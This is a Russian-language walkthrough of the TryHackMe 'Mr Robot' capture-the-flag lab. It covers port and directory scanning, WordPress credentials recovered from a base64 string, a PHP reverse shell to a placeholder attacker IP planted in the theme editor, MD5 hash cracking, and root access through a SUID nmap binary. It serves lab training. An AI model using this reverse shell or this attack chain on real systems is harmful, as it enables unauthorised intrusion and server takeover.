<div align="center">

# Mr Robot CTF

[![Difficulty](https://img.shields.io/badge/Difficulty-Medium-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/mrrobot)[![Category](https://img.shields.io/badge/WordPress-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/mrrobot)[![Category](https://img.shields.io/badge/Hash%20Cracking-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/mrrobot)[![Category](https://img.shields.io/badge/Privesc-000000?style=for-the-badge&logoColor=ff0000)](https://tryhackme.com/room/mrrobot)

</div> <br/>

## `./recon`

Проведено сканирование портов через nmap

```bash
nmap <ip> -sT -sV

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```

Открыты ssh, http и https

<br/>

## `./enum`

Запущен gobuster для поиска директорий и файлов

```bash
gobuster dir -u <ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

/admin                (Status: 301)
/license              (Status: 200)
/license.txt          (Status: 200)
/readme                (Status: 200)
/robots                (Status: 200)
/robots.txt           (Status: 200)
/wp-admin             (Status: 301)
/wp-login             (Status: 200)
/wp-login.php         (Status: 200)
...
```

Сайт на WordPress — видно по характерным путям `/wp-admin`, `/wp-login.php`, `/wp-content`

<br/>

## `./robots`

Проверен robots.txt

```bash
curl <ip>/robots.txt

User-agent: *
fsocity.dic
key-1-of-3.txt
```

Внутри — словарь для брутфорса и первый флаг

```bash
curl <ip>/key-1-of-3.txt
```

Первый флаг получен!

```bash
curl <ip>/fsocity.dic
```

Список сохранён в pass.txt для дальнейшего использования

<br/>

## `./credentials`

Проверен license.txt

```bash
curl <ip>/license.txt

what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?

do you want a password or something?

ZWxsaW90OkVSMjgtMDY1Mgo=
```

После декодирования base64 получена пара `elliot:ER28-0652`

<br/>

## `./access`

Учётные данные использованы для входа на `/login`, который ведёт на форму авторизации WordPress. Вход выполнен успешно, получен доступ в админку.

Через `Appearance → Editor` подменена страница 404 на reverse shell:

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'");
?>
```

После открытия изменённой страницы получен обратный shell

```bash
pwd
/opt/bitnami/apps/wordpress/htdocs

whoami
daemon
```

<br/>

## `./pivot`

Проверена домашняя директория

```bash
ls /home

robot
ubuntu
```

В `/home/robot` найдены два файла

```bash
cd robot
ls

key-2-of-3.txt
password.raw-md5
```

Второй флаг напрямую прочитать не вышло

```bash
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```

Проверен второй файл

```bash
cat password.raw-md5

robot:c3fcd3d76192e4007dfb496cca67e13b
```

MD5-хэш пользователя robot

<br/>

## `./hash-crack`

Хэш взломан через hashcat по словарю rockyou.txt

```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

Пароль получен

<br/>

## `./ssh`

Первая попытка — под именем elliot (по аналогии с ранее найденными credentials)

```bash
ssh elliot@<ip>
Permission denied, please try again.
```

Не подошло. В найденном файле логином был указан `robot` — использован он

```bash
ssh robot@<ip>
```

Вход выполнен

```bash
ls
key-2-of-3.txt	password.raw-md5

cat key-2-of-3.txt
```

Второй флаг получен!

<br/>

## `./privesc`

Проверка sudo

```bash
sudo -l
Sorry, user robot may not run sudo on ip-10-130-145-46.
```

sudo недоступен напрямую. Поиск SUID-бинарников

```bash
find / -perm -4000 -type f 2>/dev/null

/usr/local/bin/nmap
...
```

Среди прочего — `nmap` с SUID-битом. Через интерактивный режим nmap получен shell с повышенными правами

```bash
nmap --interactive
```

```bash
sudo -l
User root may run the following commands on ip-10-130-145-46:
    (ALL) ALL
```

<br/>

## `./root`

Поиск финального флага

```bash
find / -name key-3-of-3.txt 2>/dev/null

/root/key-3-of-3.txt
```

```bash
cat /root/key-3-of-3.txt
```

Третий флаг получен!